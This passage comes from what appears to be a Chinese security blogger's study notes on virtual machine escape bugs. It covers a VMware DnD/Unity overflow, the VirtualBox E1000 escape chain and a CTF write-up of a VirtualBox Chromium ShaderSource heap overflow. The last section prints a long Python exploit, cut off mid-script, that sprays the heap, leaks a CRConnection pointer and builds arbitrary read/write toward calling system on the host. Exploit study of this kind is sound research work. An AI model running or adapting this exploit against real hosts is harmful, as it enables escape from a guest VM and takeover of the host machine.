RpcUtil&#123;</span><br><span class="line">        <span class="keyword">void</span> * vtable;</span><br><span class="line">        RpcBase * mRpc;</span><br><span class="line">        DnDTransportBuffer&#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> seqNum;</span><br><span class="line">            <span class="keyword">uint8_t</span> * buffer;</span><br><span class="line">            <span class="keyword">uint64_t</span> totalSize;</span><br><span class="line">            <span class="keyword">uint64_t</span> offset;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RpcBase&#123;  </span><br><span class="line">    <span class="keyword">void</span> * vtable;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 DnD 对象，我们不能只覆盖 vtable 指针，因为在发生溢出之后 vtable 会立马被访问，另一个虚函数会被调用，而目前我们只能通过 unity 图像的宽度和高度控制一个 qword，所以无法控制更大的虚表。</p><p>对象中有个指针指向另一个C++对象 RpcBase，如果我们能用一个可控数据的指针的指针覆盖 mRpc 这个域，那我们就控制了 RpcBase 的 vtable。对此我们可以继续使用 unity.window.contents.start 命令来来控制 mRpc，该命令的另一个参数是 imgsize，这个参数代表分配的图像 buffer 的大小。这个 buffer 分配出来后，它的地址会存在 vmware-vmx 的固定偏移处。我们可以使用命令 unity.window.contents.chunk 来填充 buffer 的内容。步骤如下：</p><ul><li>发送unity.window.contents.start命令来分配一个buffer，后续我们用它来存储一个伪造的vtable。</li><li>发送unity.window.contents.chunk命令来填充伪造的vtable，其中填入一个栈迁移的gadget</li><li>通过溢出覆盖DnD对象的mRpc域，让它指向存储buffer地址的地方（某全局变量处），即写入一个指针的指针</li><li>通过发送DnD命令来触发mRpc域的虚函数调用</li><li>ROP</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这种几乎能任意长度溢出的漏洞利用起来基本是<code>信息泄露，泄露目标对象位置</code>-&gt;<code>修改操作vtable</code>-&gt;<code>ROP</code>。</p><h2 id="VirtualBox-E1000-0day-虚拟机逃逸漏洞"><a href="#VirtualBox-E1000-0day-虚拟机逃逸漏洞" class="headerlink" title="VirtualBox E1000 0day 虚拟机逃逸漏洞"></a>VirtualBox E1000 0day 虚拟机逃逸漏洞</h2><p><a href="https://www.anquanke.com/post/id/163714" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163714</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>VirtualBox默认虚拟网络设备为上文的82540EM（NAT模式），以下简称E1000。</p><p>E1000存在漏洞，允许guest虚拟机中拥有管理员权限的攻击者转移到主机ring3中，并利用其它方式（/dev/vboxdrv）提权至ring0。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>网卡驱动逻辑漏洞，因为处理Tx描述符校验有一些问题，可能只校验了三个却循环执行了五个。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">context_1.header_length = 0</span><br><span class="line">context_1.maximum_segment_size = 0x3010</span><br><span class="line">context_1.tcp_segmentation_enabled = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">data_2.data_length = 0x10</span><br><span class="line">data_2.end_of_packet = <span class="literal">false</span></span><br><span class="line">data_2.tcp_segmentation_enabled = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">data_3.data_length = 0</span><br><span class="line">data_3.end_of_packet = <span class="literal">true</span></span><br><span class="line">data_3.tcp_segmentation_enabled = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">context_4.header_length = 0</span><br><span class="line">context_4.maximum_segment_size = 0xF</span><br><span class="line"></span><br><span class="line">context_4.tcp_segmentation_enabled = <span class="literal">true</span></span><br><span class="line">data_5.data_length = 0x4188</span><br><span class="line">data_5.end_of_packet = <span class="literal">true</span></span><br><span class="line">data_5.tcp_segmentation_enabled = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>可以绕过校验非法改长度，达到堆溢出。具体代码不粘了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li>攻击者先卸载Linux guest虚拟机中默认加载的e1000.ko并加载漏洞利用的LKM。</li><li>LKM根据数据表初始化E1000，仅初始化发送部分即可。</li><li>LKM禁用E1000环回模式<ol><li>LKM禁用E1000环回模式，使得堆栈缓冲区溢出代码不可达。</li><li>LKM利用漏洞造成堆缓冲区溢出。</li><li>堆缓冲区溢出可用E1000 EEPROM在128KB范围内写入任意两个字节，攻击者获得写原语。</li><li>LKM利用写原语8次，将数据写入堆中ACPI（高级配置和电源接口）数据结构。写入堆缓冲区索引变量后从中读取单字节，因为缓冲区大小小于最大索引号255，攻击者可读缓冲区，获得读原语。</li><li>LKM使用读原语8次访问ACPI并从堆中读8字节数据（VBoxDD.so共享库指针）</li><li>LKM将指针减去RVA即可拿到VBoxDD.so库。</li></ol></li><li>LKM启用E1000环回模式<ol><li>LKM启用E1000环回模式，使得堆栈缓冲区溢出代码可达。</li><li>LKM利用漏洞造成栈溢出，返回地址（RIP/EIP）被覆盖，攻击者获得控制权。</li><li>利用ROP链执行shellcode。</li></ol></li><li>执行shellcode<ol><li>shellcode加载器从栈处载入shellcode执行。</li><li>shellcode利用fork和execve系统调用执行进程。</li></ol></li><li>攻击者卸载LKM并加载e1000.ko并恢复网络。</li></ul><h2 id="48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅"><a href="#48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅" class="headerlink" title="48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅"></a>48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅</h2><p><a href="https://zhuanlan.zhihu.com/p/58910752" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/58910752</a></p><p><a href="https://xz.aliyun.com/t/5008" target="_blank" rel="noopener">https://xz.aliyun.com/t/5008</a></p><h3 id="漏洞点简介"><a href="#漏洞点简介" class="headerlink" title="漏洞点简介"></a>漏洞点简介</h3><p>virtualbox通过引入OpenGL的共享库来引入3D加速功能，而Chromium负责解析Virtualbox。Chromium定义了一套用来描述OpenGL不同操作的网络协议。3D加速是作为一个virtualbox自定义的hgcm服务进程存在的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crUnpackExtendShaderSource</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    GLint *length = <span class="literal">NULL</span>;</span><br><span class="line">    GLuint shader = READ_DATA(<span class="number">8</span>, GLuint);</span><br><span class="line">    GLsizei count = READ_DATA(<span class="number">12</span>, GLsizei);</span><br><span class="line">    GLint hasNonLocalLen = READ_DATA(<span class="number">16</span>, GLsizei);</span><br><span class="line">    GLint *pLocalLength = DATA_POINTER(<span class="number">20</span>, GLint);</span><br><span class="line">    <span class="keyword">char</span> **ppStrings = <span class="literal">NULL</span>;</span><br><span class="line">    GLsizei i, j, jUpTo;</span><br><span class="line">    <span class="keyword">int</span> pos, pos_check;</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">if</span> (count &gt;= UINT32_MAX / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *) / <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        crError(<span class="string">"crUnpackExtendShaderSource: count %u is out of range"</span>, count);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ​</span><br><span class="line">    pos = <span class="number">20</span> + count * <span class="keyword">sizeof</span>(*pLocalLength);</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">if</span> (hasNonLocalLen &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        length = DATA_POINTER(pos, GLint);</span><br><span class="line">        pos += count * <span class="keyword">sizeof</span>(*length);</span><br><span class="line">    &#125;</span><br><span class="line">    ​</span><br><span class="line">    pos_check = pos;</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">if</span> (!DATA_POINTER_CHECK(pos_check))</span><br><span class="line">    &#123;</span><br><span class="line">        crError(<span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>, pos_check);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pLocalLength[i] &lt;= <span class="number">0</span> || pos_check &gt;= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))</span><br><span class="line">        &#123;</span><br><span class="line">            crError(<span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>, pos_check);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    ​</span><br><span class="line">        pos_check += pLocalLength[i];</span><br><span class="line">    &#125;</span><br><span class="line">    ​</span><br><span class="line">    ppStrings = crAlloc(count * <span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line">    <span class="keyword">if</span> (!ppStrings) <span class="keyword">return</span>;</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        ppStrings[i] = DATA_POINTER(pos, <span class="keyword">char</span>);</span><br><span class="line">        pos += pLocalLength[i];</span><br><span class="line">        <span class="keyword">if</span> (!length)</span><br><span class="line">        &#123;</span><br><span class="line">            pLocalLength[i] -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    ​</span><br><span class="line">        Assert(pLocalLength[i] &gt; <span class="number">0</span>);</span><br><span class="line">        jUpTo = i == count <span class="number">-1</span> ? pLocalLength[i] - <span class="number">1</span> : pLocalLength[i];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; jUpTo; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *pString = ppStrings[i];</span><br><span class="line">    ​</span><br><span class="line">            <span class="keyword">if</span> (pString[j] == <span class="string">'\0'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Assert(j == jUpTo - <span class="number">1</span>);</span><br><span class="line">                pString[j] = <span class="string">'\n'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">​</span><br><span class="line"><span class="comment">//    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);</span></span><br><span class="line">    cr_unpackDispatch.ShaderSource(shader, <span class="number">1</span>, (<span class="keyword">const</span> <span class="keyword">char</span>**)ppStrings, <span class="number">0</span>);</span><br><span class="line">    ​</span><br><span class="line">    crFree(ppStrings);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此方法使用宏READ_DATA获取用户数据。它只需读取客户机使用HGCM接口发送的消息(此消息存储在堆中)。然后调整输入并将其传递给cr_unpackDispatch.ShaderSource()。</p><p>实际的漏洞不太明显。即在第一个循环中，pos_check增加了一个数组的长度。在每次迭代中，都会验证地址，以确保总长度仍然在范围内。这段代码的问题是，pos_check只在下一次迭代中测试是否越界。这意味着数组的最后一个元素从未经过测试，并且可以任意大。</p><p>缺少验证会产生什么影响？本质上，在嵌套循环中，j表示pString的索引，并从0计数到pLocalLength[i]。这个循环将每个\0字节转换为一个\n字节。对于任意长度，我们可以使循环超出边界，并且由于pString指向堆上的HGCM消息中的数据，这实际上是一个堆溢出问题。</p><p>它可以将越界部分所有的’\0’替换为’\n’：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; jUpTo; ++j)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *pString = ppStrings[i];</span><br><span class="line">    ​</span><br><span class="line">    <span class="keyword">if</span> (pString[j] == <span class="string">'\0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Assert(j == jUpTo - <span class="number">1</span>);</span><br><span class="line">        pString[j] = <span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p>信息泄露部分完全与CVE-2018-3055基本相同，重写make_oob_read后通过leak_stuff我们可以泄露一个CRConnection结构体的位置，而niklasb的exp中就是通过修改pHostBuffer和cbHostBuffer来实现任意地址读。因此，当我们有任意地址写的条件之后我们就可以任意地址读了。</p><p>TODO：CVE-2018-3055是什么懒得看，具体方法在下文exp中。</p><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>一个好用的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CRVBOXSVCBUFFER_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> uiId;</span><br><span class="line">    <span class="keyword">uint32_t</span> uiSize;</span><br><span class="line">    <span class="keyword">void</span>*    pData;</span><br><span class="line">    _CRVBOXSVCBUFFER_t *pNext, *pPrev;</span><br><span class="line">&#125; CRVBOXSVCBUFFER_t;</span><br></pre></td></tr></table></figure><p>把越界写内存后面布置这么一个结构体，然后越界写它的uiSize，再越界写这个buffer的pData，然后再越界写另一个相同的结构体，就可以任意地址写了。</p><ol><li>n次调用alloc_buf，对应的buffer填充为可以触发越界写的部分，从而确保在我们可以越界写的堆后有可用的CRVBOXSVCBUFFER_t结构体。</li><li>通过SHCRGL_GUEST_FN_WRITE_READ使用第n-3个buffer，触发堆越界写，覆盖掉第n-2个buffer的size部分。</li><li>通过SHCRGL_GUEST_FN_WRITE使用第n-2个buffer，触发堆越界写，可以修改第n-1个buffer的uiSize和pData为任意值。</li><li>通过SHCRGL_GUEST_FN_WRITE使用第n-1个buffer，触发任意地址写，写的地址与长度由步骤3控制。</li><li>多次任意地址写可以通过多次反复SHCRGL_GUEST_FN_WRITE第n-2个buffer和第n-1个buffer实现。</li></ol><h4 id="整体利用"><a href="#整体利用" class="headerlink" title="整体利用"></a>整体利用</h4><ol><li>通过越界读泄露一个CRConnection结构体的位置</li><li>配置内存实现任意地址写</li><li>通过任意地址读泄露CRConnection结构体中alloc函数对应地址</li><li>通过alloc函数地址计算VBoxOGLhostcrutil.so库地址，最终泄露libc地址</li><li>修改CRConnection的disconnect函数指针为system</li><li>修改CRConnection的头部为payload</li><li>disconnect对应的client</li></ol><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line">​</span><br><span class="line">sys.path.append(os.path.abspath(os.path.dirname(__file__)) + <span class="string">'/lib'</span>)</span><br><span class="line"><span class="keyword">from</span> chromium <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hgcm <span class="keyword">import</span> *</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_oob_read</span><span class="params">(offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        pack(<span class="string">"&lt;III"</span>, CR_MESSAGE_OPCODES, <span class="number">0x41414141</span>, <span class="number">1</span>)</span><br><span class="line">        + <span class="string">'\0\0\0'</span> + chr(CR_EXTEND_OPCODE)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, offset)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, CR_GETUNIFORMLOCATION_EXTEND_OPCODE)</span><br><span class="line">        + pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>)</span><br><span class="line">        + <span class="string">'LEET'</span></span><br><span class="line">        )</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_conn</span><span class="params">(client)</span>:</span></span><br><span class="line">    <span class="string">''' Return a CRConnection address, and the associated client handle '''</span></span><br><span class="line">    <span class="comment"># Spray some buffers of sizes</span></span><br><span class="line">    <span class="comment">#  0x290 = sizeof(CRConnection) and</span></span><br><span class="line">    <span class="comment">#  0x9d0 = sizeof(CRClient)</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">600</span>):</span><br><span class="line">        alloc_buf(client, <span class="number">0x290</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">600</span>):</span><br><span class="line">        alloc_buf(client, <span class="number">0x9d0</span>)</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># This will allocate a CRClient and CRConnection right next to each other.</span></span><br><span class="line">    new_client = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        alloc_buf(client, <span class="number">0x290</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        alloc_buf(client, <span class="number">0x9d0</span>)</span><br><span class="line">​</span><br><span class="line">    hgcm_disconnect(new_client)</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># Leak pClient member of CRConnection struct, and from that compute</span></span><br><span class="line">    <span class="comment"># CRConnection address.</span></span><br><span class="line">    msg = make_oob_read(OFFSET_CONN_CLIENT)</span><br><span class="line">    leak = crmsg(client, msg, <span class="number">0x290</span>)[<span class="number">16</span>:<span class="number">24</span>]</span><br><span class="line">    pClient, = unpack(<span class="string">"&lt;Q"</span>, leak[:<span class="number">8</span>])</span><br><span class="line">    pConn = pClient + <span class="number">0x9e0</span></span><br><span class="line">    new_client = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">    set_version(new_client)</span><br><span class="line">    <span class="keyword">return</span> new_client, pConn, pClient</span><br><span class="line">​</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, where, what)</span>:</span></span><br><span class="line">        pay = <span class="string">'A'</span>*<span class="number">8</span>+pack(<span class="string">"&lt;Q"</span>,where)</span><br><span class="line">        buf,_,_,_=hgcm_call(self.client1,<span class="number">13</span>,[self.write_buf,self.write_buf_size,<span class="number">0x40</span>,pay])</span><br><span class="line"></span><br><span class="line">        hgcm_call(self.client1,<span class="number">13</span>,[<span class="number">0x41414141</span>,<span class="number">0x41414141</span>,<span class="number">0</span>,what])</span><br><span class="line">​</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write64</span><span class="params">(self, where, what)</span>:</span></span><br><span class="line">        self.write(where, pack(<span class="string">"&lt;Q"</span>, what))</span><br><span class="line">​</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self, where, n, canfail=False)</span>:</span></span><br><span class="line">        <span class="comment"># Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.</span></span><br><span class="line">        self.write64(self.pConn + OFFSET_CONN_HOSTBUF, where)</span><br><span class="line">        self.write64(self.pConn + OFFSET_CONN_HOSTBUFSZ, n)</span><br><span class="line">        res, sz = hgcm_call(self.client3, SHCRGL_GUEST_FN_READ, [<span class="string">"A"</span>*<span class="number">0x1000</span>, <span class="number">0x1000</span>])</span><br><span class="line">        <span class="keyword">if</span> canfail <span class="keyword">and</span> sz != n:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">assert</span> sz == n</span><br><span class="line">        <span class="keyword">return</span> res[:n]</span><br><span class="line">​</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read64</span><span class="params">(self, where, canfail=False)</span>:</span></span><br><span class="line">        leak = self.read(where, <span class="number">8</span>, canfail)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> leak:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> unpack(<span class="string">'&lt;Q'</span>, leak)[<span class="number">0</span>]</span><br><span class="line">​</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_stuff</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.client1 = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">        set_version(self.client1)</span><br><span class="line">​</span><br><span class="line">        self.client2 = hgcm_connect(<span class="string">"VBoxSharedCrOpenGL"</span>)</span><br><span class="line">        set_version(self.client2)</span><br><span class="line">​</span><br><span class="line">        <span class="comment"># TODO maybe spray even more?</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">400</span>): alloc_buf(self.client1, <span class="number">0x290</span>)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">400</span>): alloc_buf(self.client1, <span class="number">0x9d0</span>)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">600</span>): alloc_buf(self.client1, <span class="number">0x30</span>)</span><br><span class="line">​</span><br><span class="line">        <span class="comment"># self.master_id, self.master, _ = leak_buf(self.client1)</span></span><br><span class="line">        <span class="comment"># print('[*] Header for buffer # %d is at 0x%016x (master)' % (self.master_id, self.master))</span></span><br><span class="line">        <span class="comment"># self.victim_id, self.victim, _ = leak_buf(self.client1)</span></span><br><span class="line">        <span class="comment"># print('[*] Header for buffer # %d is at 0x%016x (victim)' % (self.victim_id, self.victim))</span></span><br><span class="line">​</span><br><span class="line">        self.client3, self.pConn, _ = leak_conn(self.client1)</span><br><span class="line">        print(<span class="string">'[*] Leaked CRConnection @ 0x%016x'</span> % self.pConn)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setup_write</span><span class="params">(self)</span>:</span></span><br><span class="line">        msg = pack(<span class="string">"&lt;III"</span>, CR_MESSAGE_OPCODES, <span class="number">0x41414141</span>, <span class="number">1</span>) \</span><br><span class="line">              + <span class="string">'\0\0\0'</span> + chr(CR_EXTEND_OPCODE) \</span><br><span class="line">              + <span class="string">'aaaa'</span> \</span><br><span class="line">              + pack(<span class="string">"&lt;I"</span>, CR_SHADERSOURCE_EXTEND_OPCODE) \</span><br><span class="line">              + pack(<span class="string">"&lt;IIIII"</span>, <span class="number">0</span>, <span class="number">0x2</span>, <span class="number">0</span>, <span class="number">0x1</span>, <span class="number">0x1a</span>+<span class="number">2</span>) +<span class="string">'A'</span>*<span class="number">4</span></span><br><span class="line">        bufs = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1000</span>):</span><br><span class="line">            bufs.append(alloc_buf(self.client1, len(msg), msg))</span><br><span class="line">        _, res, _ = hgcm_call(self.client1, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [bufs[<span class="number">-5</span>], <span class="string">"A"</span>*<span class="number">0x50</span>, <span class="number">0x50</span>])</span><br><span class="line">        self.write_buf = <span class="number">0x0a0a0000</span>+bufs[<span class="number">-4</span>];</span><br><span class="line">        self.write_buf_size = <span class="number">0x0a0a30</span>;</span><br><span class="line">​</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.leak_stuff()</span><br><span class="line">        self.setup_write()</span><br><span class="line"></span><br><span class="line">        self.crVBoxHGCMFree = self.read64(self.pConn + OFFSET_CONN_FREE, canfail=<span class="literal">True</span>)</span><br><span class="line">        print(<span class="string">'[*] Leaked crVBoxHGCMFree @ 0x%016x'</span> % 